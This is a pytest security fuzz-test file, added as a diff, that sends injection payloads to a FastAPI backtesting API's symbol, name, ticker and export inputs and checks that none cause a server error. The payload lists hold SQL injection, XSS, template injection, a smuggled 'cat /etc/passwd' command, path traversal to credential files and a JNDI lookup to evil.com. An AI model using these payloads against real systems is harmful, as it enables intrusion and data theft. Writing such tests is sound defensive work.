@@ -1,0 +1,159 @@
+"""Security fuzz tests for injection attacks.
+
+Sends SQL injection, XSS, and template injection payloads through
+API inputs (symbol, name, description) and verifies that the server
+never returns 500 (unhandled error). Valid responses are 422 (rejected
+by validation) or 2xx (safely handled/escaped).
+"""
+from __future__ import annotations
+
+import os
+
+import pytest
+from fastapi.testclient import TestClient
+
+from apps.api.app.main import app
+from apps.api.app.dependencies import get_db, get_token_verifier as _get_token_verifier
+from backtestforecast.auth.verification import AuthenticatedPrincipal
+
+INJECTION_PAYLOADS = [
+    "'; DROP TABLE users; --",
+    "' OR '1'='1",
+    "1; SELECT * FROM information_schema.tables --",
+    "' UNION SELECT NULL, NULL --",
+    "<script>alert('xss')</script>",
+    "<img src=x onerror=alert(1)>",
+    "{{7*7}}",
+    "${7*7}",
+    "{{constructor.constructor('return this')()}}",
+    "%00null_byte",
+    "../../../etc/passwd",
+    "Robert'); DROP TABLE students;--",
+    "\"; cat /etc/passwd",
+    "' AND 1=1 --",
+    "${jndi:ldap://evil.com/x}",
+]
+
+
+@pytest.fixture()
+def unauthed_client() -> TestClient:
+    """Client without any auth overrides for testing raw endpoint behavior."""
+    with TestClient(app, base_url="http://localhost") as tc:
+        yield tc
+
+
+@pytest.fixture()
+def authed_client(monkeypatch: pytest.MonkeyPatch) -> TestClient:
+    """Client with auth bypass for testing input handling."""
+    def fake_verify(_token: str) -> AuthenticatedPrincipal:
+        return AuthenticatedPrincipal(
+            clerk_user_id="clerk_fuzz_user",
+            session_id="sess_fuzz",
+            email="fuzz@example.com",
+            claims={"sub": "clerk_fuzz_user", "email": "fuzz@example.com"},
+        )
+
+    verifier = _get_token_verifier()
+    monkeypatch.setattr(verifier, "verify_bearer_token", fake_verify)
+    with TestClient(app, base_url="http://localhost") as tc:
+        yield tc
+    app.dependency_overrides.clear()
+
+
+_AUTH_HEADERS = {"Authorization": "Bearer fuzz-token"}
+
+
+class TestSymbolInjection:
+    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS, ids=lambda p: p[:30])
+    def test_backtest_symbol_rejects_injection(self, authed_client: TestClient, payload: str):
+        resp = authed_client.post(
+            "/v1/backtests",
+            json={
+                "symbol": payload,
+                "strategy_type": "long_call",
+                "start_date": "2024-01-02",
+                "end_date": "2024-03-29",
+                "target_dte": 30,
+                "dte_tolerance_days": 5,
+                "max_holding_days": 10,
+                "account_size": "10000",
+                "risk_per_trade_pct": "5",
+                "commission_per_contract": "1",
+                "entry_rules": [{"type": "rsi", "operator": "lt", "threshold": "30", "period": 14}],
+            },
+            headers=_AUTH_HEADERS,
+        )
+        assert resp.status_code != 500, (
+            f"Server error for payload {payload!r}: {resp.text}"
+        )
+
+    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS, ids=lambda p: p[:30])
+    def test_forecast_ticker_rejects_injection(self, authed_client: TestClient, payload: str):
+        resp = authed_client.get(f"/v1/forecasts/{payload}", headers=_AUTH_HEADERS)
+        assert resp.status_code != 500, (
+            f"Server error for ticker {payload!r}: {resp.text}"
+        )
+
+
+class TestNameInjection:
+    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS, ids=lambda p: p[:30])
+    def test_template_name_rejects_injection(self, authed_client: TestClient, payload: str):
+        resp = authed_client.post(
+            "/v1/templates",
+            json={
+                "name": payload,
+                "config": {
+                    "strategy_type": "long_call",
+                    "target_dte": 30,
+                    "dte_tolerance_days": 5,
+                    "max_holding_days": 10,
+                    "account_size": 10000,
+                    "risk_per_trade_pct": 2,
+                    "commission_per_contract": 0.65,
+                    "entry_rules": [{"type": "rsi", "operator": "lt", "threshold": 35, "period": 14}],
+                },
+            },
+            headers=_AUTH_HEADERS,
+        )
+        assert resp.status_code != 500, (
+            f"Server error for name {payload!r}: {resp.text}"
+        )
+
+    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS, ids=lambda p: p[:30])
+    def test_scan_name_rejects_injection(self, authed_client: TestClient, payload: str):
+        resp = authed_client.post(
+            "/v1/scans",
+            json={
+                "name": payload,
+                "mode": "basic",
+                "symbols": ["AAPL"],
+                "strategy_types": ["long_call"],
+                "rule_sets": [
+                    {"name": "t", "entry_rules": [{"type": "rsi", "operator": "lt", "threshold": "30", "period": 14}]},
+                ],
+                "start_date": "2024-01-02",
+                "end_date": "2024-03-29",
+                "target_dte": 30,
+                "max_holding_days": 10,
+                "account_size": "10000",
+                "risk_per_trade_pct": "5",
+                "commission_per_contract": "1",
+            },
+            headers=_AUTH_HEADERS,
+        )
+        assert resp.status_code != 500, (
+            f"Server error for scan name {payload!r}: {resp.text}"
+        )
+
+
+class TestPathTraversal:
+    @pytest.mark.parametrize("payload", [
+        "../../../etc/passwd",
+        "..\\..\\..\\windows\\system32\\config\\sam",
+        "%2e%2e%2f%2e%2e%2f",
+        "....//....//etc/passwd",
+    ])
+    def test_export_path_traversal(self, authed_client: TestClient, payload: str):
+        resp = authed_client.get(f"/v1/exports/{payload}", headers=_AUTH_HEADERS)
+        assert resp.status_code != 500
+        assert resp.status_code in (404, 422, 400)
